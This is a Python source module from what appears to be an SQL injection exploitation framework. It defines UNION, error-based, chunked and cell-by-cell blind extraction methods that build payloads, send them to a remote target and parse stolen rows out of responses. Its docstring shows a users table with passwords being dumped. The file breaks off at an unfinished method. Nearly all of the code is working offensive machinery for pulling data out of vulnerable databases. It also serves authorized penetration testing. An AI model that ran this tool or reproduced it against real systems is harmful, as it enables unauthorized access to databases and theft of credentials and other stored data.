"""SQL injection methods.

Retrieve results of an SQL query through various techniques from `UNION` to
error-based, blind, or time-based.

Injection methods are built incrementally: they might allow you to fetch every
result at once (e.g. UNION `SelectMethod`), or a few rows (`RowsMethod`),
one row (`RowMethod`), or even only a bit at a time (`TestMethod`).

# Usage

## Users

### Setup

Each method requires at least two arguments, including a `compiler`
(see `ending.db.generic.compiler.Compiler`) and an `inject` coroutine which
takes, as input, a payload, and returns the response from the remote target.

The docstring of each method describes the arguments it expects.

Simply initialize a method object:

    method = SelectMethod(compiler, inject, columns=10, column=3, nb_rows=1000)

### Fetching query results

And run it as many times as you need:

    query = Query("users").columns("username", "password")
    results = await method.fetch(query)
    print(results)

This yields:

    ╭──────────────┬──────────────╮
    │ username     │ password     │
    ├──────────────┼──────────────┤
    │ Huse1979     │ ah4raob5Ie   │
    │ Whish1973    │ vo1Beyae     │
    │ Siturls      │ UQue5Zee     │
    ╰──────────────┴──────────────╯

### Typing

Methods will automatically serialize the fetched data: if you query an *integer*
column, it will be retrieved as an `int`. Same applies for *text* (`str`),
*blob* (`bytes`), or *boolean* (`bool`). Furthermore, precise type information
can help slow methods work faster.

As such, providing the proper type for each column is essential:

    col_id = Identifier("id", type=IntType(min=0))
    col_session_id = Identifier("session_id", type=TextType(charset="1234567890abcdef"))
    col_session_data = Identifier("session_data", type=BlobType())
    query = Query("users").columns(col_id, col_session_id, col_session_data)
    results = await method.fetch(query)

## Developers

To create a new injection method, it is unlikely that you'll need to start from
`Method`. Standard injections (UNION, blind) are handled by `SelectMethod` and
`TestMethod`. Most of the DBMS-specific methods (such as error-based) are
derived from `ChunkMethod`. Most of the time, you'll want to derive from
`ChunkMethod` or `TestMethod`.

Implementation-wise, most `fetch_*` methods have a `_synced_fetch_*` wrapper
that provides semaphore-based synchronisation, sends feedback to the `feedback`
object, and logs the method's progress. Generally, implementors should only
care about the `fetch_*` methods.

This architecture was chosen to let users patch methods with their own
implementations without having to worry about synchronisation, feedback, or
logging, and allow them to effectively modify behaviour without having to
understand the whole implementation.

One might note that decorators could have been used, but they would have yielded
the same problems: overriding a method would have required to re-apply them.
On the other hand, having the class instance patch itself automatically would
provide less readability when reading stack traces.
"""

from __future__ import annotations

import asyncio
from itertools import chain
import re
import string
import time
from abc import ABC, abstractmethod
from asyncio import Semaphore
from math import floor, log
from typing import Any, Optional
from weakref import WeakKeyDictionary

from ending.ast import *
from ending.db.generic.compiler import Compiler
from ending.db.generic.fetcher import *
from ending.exception import ConversionError, InjectionError
from ending.struct.metadata import *
from ending.struct.parameterized import ParameterError, Parameterized
from ending.struct.resultset import ResultSet
from ending.util import logging, randomized
from ending.util.humanized import node as humanized_node
from ending.util.misc import SQL_KEYWORDS, to_bytes
from ending.util.typing import *

__all__ = [
    "Method",
    "DisplayMethod",
    "BoundedMethod",
    "RowsMethod",
    "MergedColumnsMethod",
    "DisplayMethod",
    "HexDisplayMethod",
    "SelectMethod",
    "RowMethod",
    "ChunkMethod",
    "ErrorBasedMethod",
    "CellMethod",
    "TestMethod",
    "TimebasedTestMethod",
    "InjectForBytes",
    "InjectForBool",
    "RandomTag",
    "HexRandomTag",
    "ByteSumMixin",
]


class RandomTag:
    """Property that returns a unique random string value per class instance.
    The string is composed of 4 lowercase characters.
    """

    # The value cache is stored in the class, not the instance, to avoid having
    # duplicate values for two properties in the same object
    _produced_values: WeakKeyDictionary[object, set[str]] = WeakKeyDictionary()
    _instance_value: dict[object, str]

    def __init__(self):
        self._instance_value = {}

    def generate(self, obj: object) -> str:
        """Generate a random string for the given object."""
        return randomized.lower(4)

    def __get__(self, obj, _) -> str:
        if obj is None:
            return self
        try:
            return self._instance_value[obj]
        except KeyError:
            pass

        produced_values = self._produced_values.setdefault(obj, set())

        while True:
            random = self.generate(obj)
            if random.upper() in SQL_KEYWORDS:
                continue
            if random not in produced_values:
                break

        produced_values.add(random)
        self._instance_value[obj] = random
        return random


class HexRandomTag(RandomTag):
    """Property that returns a random string value per class instance.
    The string is composed of 1 lowercase non-hexadecimal character.
    """

    __NOT_HEX_CHARSET = list(set(string.ascii_lowercase) - set(string.hexdigits + 'x'))

    def generate(self, obj: HexDisplayMethod) -> str:
        if obj.hex:
            return randomized.string(size=1, charset=self.__NOT_HEX_CHARSET)
        return super().generate(obj)


class Method(ABC, Parameterized):
    """An injection method, responsible for retrieving results for an SQL query.

    Args:
        compiler (Compiler): DBMS compiler inject (InjectForBytes): An coroutine that
        sends an SQL payload and
            returns bytes

    Events:

    The method notifies of events to indicate the progress of the method's execution.

    - `query`: The original query to be executed has been received.
    - `adjusted_query`: The query has been adjusted (e.g., for DBMS compatibility or
        limits).
    - `bounds`: The bounds (start and end indices) for the result set are known.
    - `results`: The final results for the query have been retrieved.
    - `rows`: A batch of rows has been received (partial results).
    - `length`: The expected length of a specific cell is known.
    - `cell`: The value of a specific cell is known.
    - `part`: A part (e.g., a character or byte) of a cell's value is known.
    - `exception`: An exception occurred during query execution or result retrieval.
    """

    compiler: Compiler
    """The compiler to use.
    """
    _semaphores: dict[str, Semaphore]

    def __init__(self, compiler: Compiler, inject: InjectForBytes):
        self.compiler = compiler
        self._inject = inject
        self.log = logging.logger(self.__module__)
        self.nb_requests = 0

    async def setup_semaphores(self) -> None:
        """Sets up the semaphores for the method."""
        # TODO Make semaphores an objet and add values using a function to avoid cases
        # where a newly-created semaphore instance gets replaced straight up
        self._semaphores = {}

    async def fetch(
        self,
        query: Query,
        listener: Listener | None = None,
        state: QueryState | None = None,
    ) -> ResultSet:
        """Obtains the result set for an SQL query.

        Args:
            query (Query): The SQL query
            listener (Listener, optional): A query state listener. Defaults to `None`.
            state (QueryState, optional): A query state object. Defaults to `None`.

        Returns:
            ResultSet: SQL results


        ```python
        >>> query = Query("users").columns("username", "password")
        >>> results = await method.fetch(query)
        >>> print(results)
        ╭──────────────┬──────────────╮
        │ username     │ password     │
        ├──────────────┼──────────────┤
        │ Huse1979     │ ah4raob5Ie   │
        │ Whish1973    │ vo1Beyae     │
        │ Siturls      │ UQue5Zee     │
        ╰──────────────┴──────────────╯
        ```
        """

        if state is None:
            state = QueryState()
        if listener:
            listener.link(state)

        ctx = state.context

        self.compiler.wrap(query)
        self.log.info(f"[QUERY] {humanized_node(query)}")
        ctx.notify("query", query)

        self.nb_requests = 0
        await self.setup_semaphores()

        adjusted_query = await self.adjust_query(query, ctx=ctx)
        self.compiler.wrap(adjusted_query)
        ctx.notify("adjusted_query", adjusted_query)

        try:
            results = await self._synced_fetch_results(adjusted_query, ctx=ctx)
        except InjectionError as e:
            self.log.exception("An injection error occurred while fetching results")
            ctx.notify("exception", e)
            raise
        except asyncio.CancelledError as e:
            self.log.error("Execution interrupted")
            ctx.notify("exception", e)
            raise
        except BaseException as e:
            self.log.exception("An exception occurred while fetching results")
            ctx.notify("exception", e)
            raise

        results = await self.wrap_results(query, results)

        self.log.info(f"{results.take(1000)}\n[{self.nb_requests} requests]")
        return results

    async def adjust_query(self, query: Query, ctx: Context) -> Query:
        """Potentially adapts the query to the DBMS and injection method. Calls
        `Compiler.adjust_query()` and checks that no column has an unknown type.
        """
        query = self.compiler.adjust_query(query)

        if any(
            isinstance(column.metadata.type, UnknownType) for column in query.q.columns
        ):
            raise ConversionError(
                "One of the columns still has an unknown type", payload=query
            )

        return query

    async def wrap_results(self, query: Query, results: Table) -> ResultSet:
        """Converts the results as a list of list to a `ResultSet` instance,
        i.e. a user-readable representation of the results.
        """
        return ResultSet(query, results)

    async def _synced_fetch_results(self, query: Query, ctx: Context) -> Table:
        """Wrapper for `Method.fetch_results` that assures concurrency, feedback and
        logging.
        """
        results = await self.fetch_results(query, ctx=ctx)
        ctx.notify("results", results)
        return results

    @abstractmethod
    async def fetch_results(self, query: Query, ctx: Context) -> Table:
        """Fetches the results for given query.

        Args:
            query: SQL query
            emitter: EventEmitter object
        """

    async def inject(self, payload: Node) -> bytes:
        """Sends an SQL payload to the target and returns the response.

        Returns:
            Generally, a `bytes` object is returned, but not always. For
            instance, a `TestMethod.inject` call should return a `bool`.
        """
        self.compiler.wrap(payload)
        if self.log.isEnabledFor(logging.SQL):
            self.log.sql(payload)
        self.nb_requests += 1
        return await self._inject(payload)

    def get_validator(self) -> type[MethodValidator]:
        """Gets the validator class for this method instance, if any."""
        return None

    @staticmethod
    def get_configurator() -> type[MethodConfigurator]:
        """Gets the configuration class for this method, if any."""
        return None


class BoundedMethod(Method):
    """Finds out the bounds of the expected result set before retrieving the
    results.

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    async def fetch_results(self, query: Query, ctx: Context) -> Table:
        """Obtains the lower and upper bound of the result set before retrieving
        the results.
        """
        bounds = await self._synced_fetch_bounds(query, ctx=ctx)
        return await self.fetch_results_bounded(query, bounds, ctx=ctx)

    @abstractmethod
    async def fetch_results_bounded(
        self, query: Query, bounds: tuple, ctx: Context
    ) -> Table:
        """Obtain results for given query given the lower (inclusive) and upper
        (exclusive) bound.

        Args:
            query: SQL query
            bounds: A (min, max) tuple containing the lower and higher bound to
                dump.
        """

    async def _synced_fetch_bounds(self, query: Query, ctx: Context) -> Bounds:
        """Wrapper for `BoundedMethod.fetch_bounds` that assures concurrency,
        feedback and logging.
        """
        if data := ctx.restore("bounds"):
            return data.data
        bounds = await self.fetch_bounds(query, ctx=ctx)
        ctx.notify("bounds", bounds)
        self.log.info(f"Fetching rows from {bounds[0]} to {bounds[1]}")
        return bounds

    async def fetch_bounds(self, query: Query, ctx: Context) -> Bounds:
        """Returns a tuple representing the range of rows that are to be dumped.
        The tuple is of the form [min, max[ (`min` is inclusive and `max` is not).
        """
        # TODO A better option would be to check if COUNT(*) >= omax first if a
        # query limit is specified, as it will often be true

        # If the query specified a limit, it can happen that the limit exceeds
        # the number of rows, so COUNT(*) needs to be retrieved
        if query.q.limit:
            omin, omax = query.q.limit.get_start_stop()
            if not query.metadata.single:
                omax = min(omax, await self.fetch_count(query))
            return omin, omax
        # Retrieve one row
        if query.metadata.single:
            return 0, 1
        # Retrieve everything
        return 0, await self.fetch_count(query)

    def _get_int(self, results: Table, message: str, payload: Node = None) -> int:
        """Returns the first element of the results, as an int, or raises
        `SQLInjectionError`.
        """
        # TODO int() should not be required: COUNT should be deserialized into
        # an integer.
        try:
            return int(results[0][0])
        except (IndexError, ValueError, TypeError):
            raise InjectionError(message, payload)

    def _sql_get_count(self, query: Query) -> Query:
        """Returns a query that counts the number of items returned by `query`."""
        # If the query is DISTINCT, we need to use a subquery to count the number of
        # rows
        if query.q.distinct:
            return Query(Alias.randomized(query)).columns(Count())
        return query.columns(Count()).order(None).limit(None).distinct(False)

    async def fetch_count(self, query: Query) -> int:
        """Returns the total number of rows the query yields."""
        query = self._sql_get_count(query)
        results = await self.fetch_results_bounded(query, (0, 1), VoidContext())
        return self._get_int(results, "Unable to count number of rows", query)


class RowsMethod(BoundedMethod):
    """Abstract injection method that retrieves `nb_rows` rows at a time.
    For instance, this can be the case when a UNION injection only displays 5
    results per page.

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
        nb_rows (int): Maximum number of rows that can be retrieved at once.
    """

    nb_rows: int
    """Maximum number of rows that can be retrieved at once."""

    def __init__(self, compiler: Compiler, inject: InjectForBytes, *, nb_rows: int):
        super().__init__(compiler, inject)

        self.check_parameters(
            locals(),
            required={
                "nb_rows": int,
            },
            optional={},
        )

        self.nb_rows = nb_rows

    async def setup_semaphores(self) -> None:
        await super().setup_semaphores()
        self._semaphores["rows"] = Semaphore(10)

    async def fetch_results_bounded(
        self, query: Query, bounds: Bounds, ctx: Context
    ) -> Table:
        """Obtains several rows, in batches of size `nb_rows`."""
        semaphore = self._semaphores["rows"]

        tasks = []
        omin, omax = bounds

        for p in range(omin, omax, self.nb_rows):
            # Create tasks only when they can start, to avoid having too many in
            # the pipe
            async with semaphore:
                pass

            nb_rows = min(self.nb_rows, omax - p)
            row_query = query.limit(p, nb_rows) if not query.metadata.single else query
            rows_ctx = ctx.with_(row=p - omin, nb_rows=nb_rows)
            task = asyncio.create_task(self._synced_fetch_rows(row_query, ctx=rows_ctx))
            tasks.append(task)

        all_rows = await asyncio.gather(*tasks)

        # Ensure we obtained the correct number of rows for each batch
        nb_remaining_rows = omax - omin
        for i, rows in enumerate(all_rows):
            nb_expected = min(self.nb_rows, nb_remaining_rows)
            nb_remaining_rows -= self.nb_rows
            if len(rows) != nb_expected:
                all_rows[i] = self._try_adjust_rows(i, rows, nb_expected)

        return list(chain.from_iterable(all_rows))

    def _try_adjust_rows(self, i: int, rows: Table, nb_expected: int):
        """Tries to remove extraneous rows from the result. When this method is called,
        it is garantied that nb_rows != nb_expected.
        """
        nb_rows = len(rows)

        # TODO Clearer message when the modulo is wrong
        if nb_rows < nb_expected or nb_rows % nb_expected != 0:
            raise InjectionError(
                f"Task #{i} dumped {nb_rows} rows instead of the expected {nb_expected}"
            )
        # We have M*N rows instead of the expected N. Let's get rid of (M-1)*N of them.
        # We need to know if the results are in the form AABB or ABAB
        duplicates = nb_rows // nb_expected
        base = rows[::duplicates]

        # Check for AABB
        if all(base == rows[i::duplicates] for i in range(1, duplicates)):
            self.log.debug("Automatically removing extraneous results (AABB)")
            return base
        # Otherwise, it's ABAB
        else:
            self.log.debug("Automatically removing extraneous results (ABAB)")
            return rows[:nb_expected]

    async def _synced_fetch_rows(self, query: Query, ctx: Context) -> Table:
        """Wrapper for `RowsMethod.fetch_rows` that assures concurrency,
        feedback and logging.
        """
        if data := ctx.restore("rows"):
            return data.data

        self.compiler.wrap(query)
        async with self._semaphores["rows"]:
            rows = await self.fetch_rows(query, ctx=ctx)
        ctx.notify("rows", rows)
        pos = f"{query.q.limit.start}-{query.q.limit.count}" if query.q.limit else "-"
        self.log.debug(f"Rows[{pos}]: {rows!r}")
        return rows

    @abstractmethod
    async def fetch_rows(self, query: Query, ctx: Context) -> Table:
        """Obtains several rows from `query`."""


class MergedColumnsMethod(RowsMethod):
    """Abstract method that converts a query with several columns into a query with a
    single merged column before dumping it. It takes each column, serializes it,
    coalesces it with `tag_null`, then joins the columns using `tag_separator`. After
    results have been obtained, they are split again using the same logic to obtain
    proper SQL results.

    Subclasses must define the `fetch_merged_rows` method, which retrieves the results
    of a query with merged columns.
    """

    tag_separator: str = RandomTag()
    """A string columns will be joined with.
    Defaults to a random string of 4 characters.
    """
    tag_null: str = RandomTag()
    """A value to replace null values with.
    Defaults to a random string of 4 characters.
    """

    async def fetch_rows(self, query: Query, ctx: Context) -> Table:
        """Merges columns into one, fetches rows, then splits the columns back again."""
        merged_query = self.merge_columns(query)
        rows = await self.fetch_merged_rows(merged_query, ctx=ctx)
        return self.split_columns(query, rows)

    @abstractmethod
    async def fetch_merged_rows(self, query: Query, ctx: Context) -> list[bytes]:
        """Fetches the rows for a query with merged columns."""

    def merge_columns(self, query: Query) -> Query:
        """Merges every column of given query into one by concatenating them,
        separated by the `separator` parameter. Each column is first `COALESCE`d
        so that NULL columns don't break the concatenation.
        """
        columns = list(map(self.serialize_cell, query.q.columns))
        columns = ConcatWS(self.tag_separator, columns)
        return query.columns(columns)

    def split_columns(self, query: Query, merged_results: list[bytes]) -> Table:
        """Splits the single-column results into several columns, for each row,
        in order to get expected results.
        """
        separator = re.compile(
            re.escape(self.tag_separator.encode()), flags=re.IGNORECASE
        )
        return [
            [
                self.deserialize_cell(column, cell)
                for column, cell in zip(query.q.columns, separator.split(row))
            ]
            for row in merged_results
        ]

    def serialize_cell(self, column: Node) -> Node:
        """Converts a column into a `TextType` column and converts `NULL`s into
        a placeholder string.
        """
        serialized = self.compiler.serialize(column)
        if not column.metadata.nullable:
            return serialized
        return Function["COALESCE"](
            serialized,
            Value(self.tag_null),
            type=TextType(),
            single=column.metadata.single,
            nullable=False,
        )

    def deserialize_cell(self, column: Node, cell: bytes) -> Cell:
        """Converts a cell back to its original type."""
        if cell.lower() == self.tag_null.encode():
            return None
        return self.compiler.deserialize(column.metadata.type, cell)


class DisplayMethod(MergedColumnsMethod):
    """Abstract method that retrieves results that are fully or partially
    displayed in the response.

    The method uses a case-insensitive regex to extract results from the response; it
    does so to avoid complications in case the SQL results are "processed" by the target
    server.
    
    Subclasses must define the `fetch_merged_rows` method, which retrieves the results
    of a query with merged columns.

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
        nb_rows (int): Maximum number of rows that can be retrieved at once.
    """

    tag_start: str | None = RandomTag()
    """Indicates the beginning of a result row in the output.
    Defaults to a random string of 4 characters.
    """
    tag_stop: str = RandomTag()
    """Indicates the end of a result row in the output.
    Defaults to a random string of 4 characters.
    """
    pattern: re.Pattern[bytes]
    """A regex that matches results in the page. Generally, it matches between
    `DisplayMethod.tag_start` and `DisplayMethod.tag_stop`.
    """

    def __init__(self, compiler: Compiler, inject: InjectForBytes, *, nb_rows: int):
        super().__init__(compiler, inject, nb_rows=nb_rows)
        self._compile_pattern()
        self._split_tags = self._should_split_tags()

    def _compile_pattern(self) -> None:
        """Creates a `DisplayMethod.pattern` that matches bytes between `tag_start` and
        `tag_stop`.
        """
        pattern = "{}(.*?){}".format(
            re.escape(self.tag_start), re.escape(self.tag_stop)
        )
        self.pattern = re.compile(pattern.encode(), flags=re.DOTALL | re.IGNORECASE)

    def extract_results(self, response: bytes, payload: Node) -> list[bytes]:
        results = self.pattern.findall(response)
        if not results:
            raise InjectionError("Unable to find chunk in response", payload=payload)

        return results

    def _should_split_tags(self) -> bool:
        """Indicates if `DisplayMethod.tag_start` and
        `DisplayMethod.tag_stop` should be split in two in the payload.

        Some targets write back the payload; with standard string encodings,
        such as singlequote, the pattern might match the echoed back payload
        and produce unwanted results.
        """

        def tag_within_output(tag: str) -> bool:
            return (
                tag
                and tag.lower().encode()
                in self.compiler.compile(Value(tag)).encode().lower()
            )

        return tag_within_output(self.tag_start) or tag_within_output(self.tag_stop)

    def _maybe_split_tag(self, tag: str) -> tuple[Node, ...]:
        """Split tag if required."""
        if not self._split_tags or len(tag) <= 1:
            return (Value(tag),)
        return Value(tag[:1]), Value(tag[1:])


class HexDisplayMethod(DisplayMethod):
    """An abstract method that retrieves columns as hexadecimal strings, to bypass
    display filters or limitations.

    Adds the `hex` parameter to the constructor. If set, text nodes get hex encoded
    before they are sent to the DBMS, and the response is decoded from hexadecimal.
    """

    hex: bool
    """Whether to retrieve text columns as hexadecimal strings."""

    # Since we're only using hexadecimal characters, we can use characters from other
    # classes to delimit the chunks
    tag_stop: str = HexRandomTag()
    tag_separator: str = HexRandomTag()
    tag_null: str = HexRandomTag()

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        *,
        nb_rows: int,
        hex: bool = False,
        **kwargs,
    ):
        self.hex = hex
        super().__init__(compiler, inject, nb_rows=nb_rows, **kwargs)

    def serialize_cell(self, column: Node) -> Node:
        """Serializes text cells to hexadecimal. BlobTypes are already converted to
        hexadecimal by the compiler, while BoolType and IntType are (generally) in hex
        form by design.

        This method makes the assumption that Hex(NULL) returns NULL, which is true for
        most DBMSs.
        """
        if self.hex and isinstance(column.metadata.type, TextType):
            column = Hex(column)
        return super().serialize_cell(column)

    def deserialize_cell(self, column: Node, cell: bytes) -> Any:
        cell = super().deserialize_cell(column, cell)

        if cell is not None and self.hex and isinstance(column.metadata.type, TextType):
            try:
                cell = bytes.fromhex(cell)
            except ValueError:
                cell = cell[:100] + "..." if len(cell) > 100 else cell
                raise ConversionError(
                    f"Unable to decode hex chunk: {cell!r}", payload=column
                )
            try:
                cell = cell.decode(self.compiler.encoding)
            except UnicodeDecodeError:
                cell = cell[:100] + b"..." if len(cell) > 100 else cell
                raise ConversionError(
                    f"Unable to convert to string: {cell!r} (try retrieving as blob)",
                    payload=column,
                )

        return cell

    def get_validator(self) -> type[MethodValidator]:
        """Only allow the custom validation if we're not in hex mode."""
        return super().get_validator()


class RowMethod(RowsMethod):
    """Abstract injection method that retrieves SQL results one row at a time.
    This is, for instance, the case for error-based SQL injections.

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    def __init__(self, compiler: Compiler, inject: InjectForBytes):
        super().__init__(
            compiler,
            inject,
            nb_rows=1,
        )

    async def fetch_rows(self, query: Query, ctx: Context) -> Table:
        # Since we're in RowMethod, this function will only get called with one
        # row, so we can safely forward to `fetch_row` and return the result as
        # an array.
        return [await self.fetch_row(query, ctx=ctx)]

    @abstractmethod
    async def fetch_row(self, query: Query, ctx: Context) -> Row:
        """Obtains a single row. Query is assumed to return only one row.

        Args:
            query: A single-row query
        """


class SelectMethod(HexDisplayMethod):
    """Select SQL injection method.

    This method injects a SELECT query with `columns` columns whose column at
    index `column` contains results. Suitable for UNION SQL injections or raw
    SQL queries.

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
        nb_rows (int): Maximum number of rows that can be retrieved at once
        columns (int, list): Number of columns in the first SELECT statement.
            Alternatively, can also be a list of columns.
        column (int): Index of a column that is displayed on the page
        dummy_column (Node): The value to give to unused columns. Defaults to `NULL`.
        hex (bool): Whether to encode text columns in hex. Defaults to `False`.
    """

    column: int
    """Index of a column that is displayed on the page."""
    columns: list[Node]
    """The list of columns for the SELECT statement."""

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        *,
        nb_rows: int,
        columns: int | list[Node],
        column: int,
        dummy_column: Node = Value(None),
        hex: bool = False,
    ):
        super().__init__(
            compiler,
            inject,
            nb_rows=nb_rows,
            hex=hex
        )
        self.check_parameters(
            locals(),
            required={
                "column": int,
                "columns": (int, list),
                "dummy_column": Node,
            },
            optional={},
        )

        self.column = column

        if isinstance(columns, list):
            self.columns = list(
                Node.node_cast(column, Value, True) for column in columns
            )
        else:
            self.columns = [dummy_column] * columns

        if self.column >= len(self.columns):
            raise ParameterError(
                "column",
                f"index {self.column} is out of range for {len(self.columns)} columns",
            )

    def build_payload(self, query: Query) -> Node:
        """Builds an SQL query matching the requirements of this SELECT method,
        such as the number of fields and the position of the displayed field.
        """
        # Generate a single column: <start-tag><columns><stop-tag>
        payload = Concatenation(
            (
                self._maybe_split_tag(self.tag_start)
                + query.q.columns.items
                + self._maybe_split_tag(self.tag_stop)
            )
        )
        # Write payload on column that gets output
        columns = self.columns[:]
        columns[self.column] = payload
        return query.columns(*columns)

    async def fetch_merged_rows(self, query: Query, ctx: Context) -> list[bytes]:
        payload = self.build_payload(query)
        response = await self.inject(payload)
        return self.extract_results(response, payload=payload)

    @staticmethod
    def get_validator() -> type[MethodValidator]:
        from ending.validation import SelectMethodValidator

        return SelectMethodValidator

    @staticmethod
    def get_configurator() -> type[MethodConfigurator]:
        from ending.configuration import SelectMethodConfigurator

        return SelectMethodConfigurator



class ChunkMethod(HexDisplayMethod):
    """Injection method where only part of an SQL cell is displayed, such as
    error-based SQL injections, that will only display N bytes of data (*e.g.*
    MySQL's `ExtractValue()` will only yield 32-chars error messages).

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
        size (int): Maximum size for a chunk; number of displayed bytes.
            Defaults to `0x100000` (1 MB).
        pattern (bytes): A pattern to extract data from the HTTP response.
            Generally, it is the error message displayed by the application.
            If not specified, a pattern will be build automatically, to the
            expense of performance.
        hex (bool): Whether to encode text columns in hex. Defaults to `False`.

    Behaviour:

        1.  Columns are merged into one column, separated by `separator`.
        2.  `tag_stop` is appended at the end of the structure, indicating the
            end of the row.
        3.  The method fetches the first chunk of size `size`.
            If `tag_stop` is not found, a second chunk if fetched, and so on.
        4.  Results are split using `tag_separator`, and returned.

    Note:
        Specifying `pattern` will improve performance since, without a pattern,
        a tag has to be prepended to each chunk in order to find it in the page:
        this will reduce the number of data obtained on each request, and
        therefore reduce the overall speed.
    """

    tag_start: str | None = RandomTag()
    """Indicates the beginning of a chunk in the output."""
    tag_stop: str = RandomTag()
    """Indicates the end of a result row in the output."""

    size: int
    """Maximum size for a chunk; number of displayed bytes."""
    pattern: re.Pattern[bytes]
    """A pattern to extract data from the HTTP response.
    Generally, it is the error message displayed by the application.
    """

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        *,
        size: Optional[int] = 0x100000,
        pattern: Optional[bytes] = None,
        hex: bool = False,
    ):
        if pattern is None and self.tag_start is None:
            raise ValueError("If pattern is not set, tag_start must be")

        self.pattern = pattern
        super().__init__(
            compiler,
            inject,
            nb_rows=1,
            hex=hex
        )
        self.check_parameters(
            locals(),
            required={
                "size": int,
            },
            optional={
                "pattern": (re.Pattern, str, bytes),
            },
        )

        self.size = size

    def _compile_pattern(self) -> None:
        if self.pattern is None:
            self.pattern = "{}(.*)".format(re.escape(self.tag_start))
        else:
            self.tag_start = None

        if not isinstance(self.pattern, re.Pattern):
            self.pattern = re.compile(
                to_bytes(self.pattern), flags=re.DOTALL | re.IGNORECASE
            )

    def build_payload(self, query: Query, position: int) -> Node:
        """Builds the SQL payload that returns a chunk of the data. The chunk
        starts at given `position`.

        Args:
            query (Query): a one-cell query.
            position (int): index of the first byte to dump.
        """
        payload = Concatenation(
            (query.q.columns[0],) + self._maybe_split_tag(self.tag_stop)
        )
        # We cannot manipulate the column and inject it in the query at the
        # very end because DISTINCT SUBSTR(...) would not return the expected
        # results
        payload = query.columns(payload)
        payload = Substring(payload, position, self.size)
        if self.tag_start is not None:
            payload = Concatenation(self._maybe_split_tag(self.tag_start) + (payload,))
        return payload

    def extract_results(self, response: bytes, payload: Node) -> bytes:
        rows = super().extract_results(response, payload)
        return rows[0]

    async def fetch_merged_rows(self, query: Query, ctx: Context) -> list[bytes]:
        """Obtains the full result row by grabbing each chunk one by one until
        `tag_stop` has been retrieved.
        """
        result = b""
        chunk_size = self.size
        # TODO Check negative in __init__
        if self.tag_start:
            chunk_size -= len(self.tag_start)

        tag_stop = self.tag_stop.encode().lower()
        nb_bytes_to_check = max(self.size, len(tag_stop))

        while True:
            payload = self.build_payload(query, position=len(result))
            response = await self.inject(payload)

            chunk = self.extract_results(response, payload=payload)

            if not chunk:
                raise InjectionError("Retrieved chunk is empty", payload=payload)

            result += chunk[:chunk_size]

            # Look for tag_stop in the results and exit the loop if it has been found
            if tag_stop in result[-nb_bytes_to_check:].lower():
                break

        result = result[: result.lower().index(tag_stop, -nb_bytes_to_check)]
        return [result]

    @staticmethod
    def get_validator() -> type[MethodValidator]:
        from ending.validation import ChunkMethodValidator

        return ChunkMethodValidator


class ErrorBasedMethod(ChunkMethod):
    """Abstract error-based injection method.
    The method relies on verbose error messages to extract data from the database.
    Examples include `ExtractValue()` for MySQL or `CAST as int` for MS SQL.
    """

    @staticmethod
    def get_configurator() -> type[MethodConfigurator]:
        from ending.configuration import ErrorBasedMethodConfigurator

        return ErrorBasedMethodConfigurator


class CellMethod(RowMethod):
    """Abstract injection method that retrieves SQL results one cell at a time (a cell
    is a single row, single column query).

    Args:
        compiler (Compiler): DBMS compiler
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    async def setup_semaphores(self) -> None:
        await super().setup_semaphores()
        self._semaphores["rows"] = Semaphore(2)
        self._semaphores["cells"] = Semaphore(10)

    def _needs_order_by(self, query: Query) -> bool:
        """Returns True if the query needs an ORDER BY clause to ensure the order of
        the results is preserved.
        """
        # When fetching several columns separately, there is no garantee the
        # results will be in the same order; we have to specify an order if it
        # has not been done
        return (
            not query.metadata.single
            and query.q.table
            and not query.q.order
            and len(query.q.columns) >= 2
        )

    async def adjust_query(self, query: Query, ctx: Context) -> Query:
        """If required, adds an order by clause to preserve the order."""
        if self._needs_order_by(query):
            query = query.order([Order(node=c) for c in query.q.columns])
        return await super().adjust_query(query, ctx=ctx)

    async def fetch_results_bounded(
        self, query: Query, bounds: Bounds, ctx: Context
    ) -> Table:
        # When using DISTINCT, we need to build a superquery, because DISTINCT x, y !=
        # DISTINCT x, DISTINCT y
        if query.q.distinct and len(query.q.columns) >= 2:
            query = query.super_query().limit(query.q.limit)

        return await super().fetch_results_bounded(query, bounds, ctx=ctx)

    async def fetch_row(self, query: Query, ctx: Context) -> Row:
        """Obtains each column of a row, one by one."""
        tasks = (
            self._synced_fetch_cell(query.columns(column), ctx.with_(column=i))
            for i, column in enumerate(query.q.columns)
        )
        return await asyncio.gather(*tasks)

    async def _synced_fetch_cell(self, query: Query, ctx: Context) -> Cell:
        """Wrapper for `CellMethod.fetch_cell` that assures concurrency, feedback and
        logging.
        """
        if data := ctx.restore("cell"):
            return data.data

        self.compiler.wrap(query)
        async with self._semaphores["cells"]:
            cell = await self.fetch_cell(query, ctx=ctx)

        ctx.notify("cell", cell)
        self.log.debug(f"Cell: {query} -> {cell!r}")
        return cell

    @abstractmethod
    async def fetch_cell(self, query: Query, ctx: Context) -> Cell:
        """Fetches a cell. Query is expected to select one column and return one
        row only (e.g.: `SELECT x FROM y LIMIT z, 1`).
        """


class TypedCellMethod(CellMethod, ABC):
    async def fetch_cell(self, query: Query, ctx: Context) -> Cell:
        """Gets the contents of a cell in function of its type."""
        if query.metadata.nullable and await self.fetch_cell_is_null(query):
            return None

        match query.metadata.type:
            case TextType():
                return await self.fetch_text(query, ctx=ctx)
            case BlobType():
                return await self.fetch_blob(query, ctx=ctx)
            case BoolType():
                return await self.fetch_bool(query, ctx=ctx)
            case IntType():
                return await self.fetch_int(query, ctx=ctx)
            case _:
                # Cannot be reached: value cannot be of unknown type
                raise RuntimeError(
                    f"Cannot fetch cell {query.q.columns[0]!r} with type {query.metadata.type!r}"
                )

    async def fetch_cell_is_null(self, expr: Node, negate: bool = False) -> bool:
